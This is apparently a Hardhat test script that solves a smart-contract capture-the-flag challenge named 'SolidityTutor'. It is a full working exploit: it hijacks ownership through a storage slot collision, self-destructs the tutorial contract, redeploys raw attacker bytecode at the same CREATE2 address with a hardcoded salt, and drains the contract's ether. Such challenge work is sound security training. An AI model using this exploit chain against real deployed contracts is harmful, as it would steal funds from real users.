import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("SolidityTutor", function () {
    let signer: Signer;
    let player: string;
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    // Set the challenge instance to the address returned when deploying the challenge.
    let challenge_instance_address = "0xA3e7b2383EBfEAf93A609F611ae8C7cA0e4c7db2";
    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);

        // comment the next two lines if running locally 
        challengeFactory = await ethers.getContractFactory("SolidityTutor");
        challenge = challengeFactory.attach(challenge_instance_address);

        // uncomment if running locally:
        // challengeFactory = await ethers.getContractFactory("SolidityTutor");
        // challenge = await challengeFactory.deploy({ value: ethers.utils.parseEther("0.001")}) /**put your constructor args here*/;
        // await challenge.deployed();
    });

    it("Should solve the challenge", async () => {
        let b = await ethers.provider.getBalance(challenge.address);
        console.log("Starting balance:", BigNumber.from(b).toString());
        const currentOwner = await challenge.owner();
        
        try {
            const resetTx = await challenge.resetToInitialTutorial(
                { value: ethers.utils.parseEther("0.001"), gasLimit: 5000000 }
                );
                const resetReceipt = await resetTx.wait();
                console.log("Tutorial reset complete, now attacking storage slot clash vulnerability to change owner:");
        } catch (e) {
                console.log(e);
                console.error("Error during challenge.resetToInitialTutorial()");
                process.exit();
        }

        const currentTutorialContract = await challenge.currentTutorialContract();
        console.log("Starting Owner: ", currentOwner);
        console.log("Computed CREATE2 Contract address", currentTutorialContract);
        
        // Deploying helper contract:
        const helperFactory = await ethers.getContractFactory("SolidityTutorHelper");
        const helper = await helperFactory.deploy();
        await helper.deployed();
        
        console.log("Helper contract deployed at:", helper.address);

        // Attacking storage slot collision vulnerability:
        try {
            const changeOwnerTx = await helper.changeOwner(player, challenge.address, { gasLimit: 500000 });
            const changeOwnerReceipt = await changeOwnerTx.wait();
            const owner = await challenge.owner();
            console.log("New owner is player?", owner == player);
            console.log("Proceeding to deletion of initial contract through GoodByeWorld()");
        } catch (e) {
            console.log("Error during changeOwner()");
            process.exit();
        }
        
        try { 
            const goodbyeWorldTx = await helper.killTutorial(currentTutorialContract, { gasLimit: 500000 });
            const goodbyeWorldReceipt = await goodbyeWorldTx.wait();
            console.log("GoodbyeWorld succeeded, now attempting to override tutorial contract");
        } catch (e) {
            console.log("Error during GoodByeWorldTx");
            process.exit();
        }

        // This can be found by decompiling the code of the SolidityTutor contract. Because the salt is a constant state variable, the value is applied to all references at compile time, meaning that the value is basically hardcoded into the final bytecode.
        const salt = 133742069;

        // This bytecode was generated with solc. It can also be retrieved from Remix by compiling the contract and goingn to the compilation details menu.
        const attacker_bytecode = "0x608060405234801561001057600080fd5b506102e4806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806312065fe01461004657806353ce9e3914610064578063d018db3e14610082575b600080fd5b61004e6100b2565b60405161005b9190610153565b60405180910390f35b61006c6100ba565b6040516100799190610187565b60405180910390f35b61009c60048036038101906100979190610205565b6100c4565b6040516100a9919061024d565b60405180910390f35b600047905090565b6000610539905090565b6000808273ffffffffffffffffffffffffffffffffffffffff16476040516100eb90610299565b60006040518083038185875af1925050503d8060008114610128576040519150601f19603f3d011682016040523d82523d6000602084013e61012d565b606091505b5050905080915050919050565b6000819050919050565b61014d8161013a565b82525050565b60006020820190506101686000830184610144565b92915050565b6000819050919050565b6101818161016e565b82525050565b600060208201905061019c6000830184610178565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101d2826101a7565b9050919050565b6101e2816101c7565b81146101ed57600080fd5b50565b6000813590506101ff816101d9565b92915050565b60006020828403121561021b5761021a6101a2565b5b6000610229848285016101f0565b91505092915050565b60008115159050919050565b61024781610232565b82525050565b6000602082019050610262600083018461023e565b92915050565b600081905092915050565b50565b6000610283600083610268565b915061028e82610273565b600082019050919050565b60006102a482610276565b915081905091905056fea264697066735822122076936362e0adadf8d63a1b7169ebc4221551ab3b2aa2580b3faa2e87c462cf7364736f6c634300080f0033";

        try { 
            const changeTutorialTx = await challenge.changeTutorial(salt, attacker_bytecode, 
                { gasLimit: 5000000 }
            );
            const changeTutorialReceipt = await changeTutorialTx.wait();
            console.log("Tutorial changed, now attempting final attack to steal ether");
        } catch (e) {
            console.log("Error at changeTutorialTx");
            process.exit();
        }

        const attackerFactory = await ethers.getContractFactory("SolidityTutorAttacker");
        const attacker = attackerFactory.attach(currentTutorialContract);
        const sanity = await attacker.sanity();
        console.log("Checking sanity() function to see if attacker contract deployed:", BigNumber.from(sanity).toString());
        try { 
            // Add extra large gas fees to prevent unwanted behaviours.
            const attackTx = await helper.attack(player, challenge.address, { gasLimit: 1000000 });
            const attackReceipt = await attackTx.wait();
            console.log("Attack complete, now checking if solved...");
        } catch (e) {
            console.error("Error at helper.attack()");
            process.exit();
        }
        
        const balance = await ethers.provider.getBalance(challenge.address);
        console.log("address balance:", BigNumber.from(balance).toString());
        const solved = await challenge.isSolved();
        console.log("Solved?", solved);
        expect(solved).to.be.true;
    });
});